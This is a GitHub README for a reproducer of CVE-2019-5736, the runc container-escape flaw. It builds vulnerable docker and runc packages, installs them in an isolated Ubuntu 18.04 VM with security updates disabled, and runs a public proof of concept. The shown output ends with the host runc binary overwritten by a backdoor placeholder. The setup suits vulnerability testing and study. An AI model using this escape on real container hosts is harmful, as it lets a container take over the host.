# cve-2019-5736-reproducer

null

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/takumak](https://github.com/takumak) |
| Url      | [https://github.com/takumak/cve-2019-5736-reproducer](https://github.com/takumak/cve-2019-5736-reproducer)                                               |
| Stars    | 0                                                          |
| License  | GNU General Public License v2.0                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# [CVE-2019-5736] reproducer

This allows you to confirm [RunC-CVE-2019-5736] works on your KVM instance.

[RunC-CVE-2019-5736]: https://github.com/twistlock/RunC-CVE-2019-5736
[CVE-2019-5736]: https://nvd.nist.gov/vuln/detail/CVE-2019-5736

## Workflow overview

* Build the `docker.io` related packages vulerable to [CVE-2019-5736] in this repo
* Launch an Ubuntu 18.04 KVM instance on LXD
* Install the vulnerable `*.deb` packages in the VM
* Try the procedure introduced at [RunC-CVE-2019-5736]

## Build vulnerable `*.deb` packages

```bash
$ docker-compose build --no-cache
$ docker-compose run build
```

## Prepare [RunC-CVE-2019-5736] source tarball

```bash
$ git clone https://github.com/twistlock/RunC-CVE-2019-5736.git
$ tar cjf RunC-CVE-2019-5736.tar.bz2 RunC-CVE-2019-5736
```

## Launch an Ubuntu 18.04 KVM instance on LXD

```bash
$ lxc launch --vm images:ubuntu/18.04 test-cve-2019-5736 -c limits.cpu=4 -c limits.memory=4GB
$ lxc file push deb/*.deb RunC-CVE-2019-5736.tar.bz2 test-cve-2019-5736/root/
$ lxc exec test-cve-2019-5736 bash
root@test-cve-2019-5736:~# sed -i -e '/bionic-updates/s/^/#/' -e '/bionic-security/s/^/#/' /etc/apt/sources.list
root@test-cve-2019-5736:~# apt update
root@test-cve-2019-5736:~# apt install iptables libltdl7
root@test-cve-2019-5736:~# dpkg -i containerd_0.2.5-0ubuntu2_amd64.deb docker.io_17.12.1-0ubuntu6_amd64.deb runc_1.0.0~rc6+git20181203.96ec2177-0~ubuntu2_amd64.deb
```

Note that you should use `images:ubuntu/18.04` instead of `ubuntu:18.04` because the `lxc exec` command doesn't work properly with the latter one.

## Reproduce [RunC-CVE-2019-5736]

```bash
$ lxc exec test-cve-2019-5736 bash
root@test-cve-2019-5736:~# tar xf RunC-CVE-2019-5736.tar.bz2
root@test-cve-2019-5736:~# cd RunC-CVE-2019-5736
root@test-cve-2019-5736:~/RunC-CVE-2019-5736# docker build -t cve-2019-5736:exec_POC ./exec_POC
root@test-cve-2019-5736:~/RunC-CVE-2019-5736# docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
92b965383f377419f3dad7cec45e468a4c4a83e82e11a2f2e0e23803016e2840
root@test-cve-2019-5736:~/RunC-CVE-2019-5736# docker exec poc_ctr bash
No help topic for '/usr/bin/bash'
root@test-cve-2019-5736:~/RunC-CVE-2019-5736# /usr/bin/docker-runc

**THE ALL NEW AND IMPROVED RUNC**

        [+] Your backdoor here ->

root@test-cve-2019-5736:~/RunC-CVE-2019-5736# 
```

## Appendix

* Fix commit: https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b



## Get the content

```
git clone https://github.com/takumak/cve-2019-5736-reproducer
cd cve-2019-5736-reproducer
```

{% embed url="https://github.com/takumak/cve-2019-5736-reproducer" %}

<figure><img src="https://avatars.githubusercontent.com/u/11924923?v=4" alt=""><figcaption><p>takumak</p></figcaption></figure>
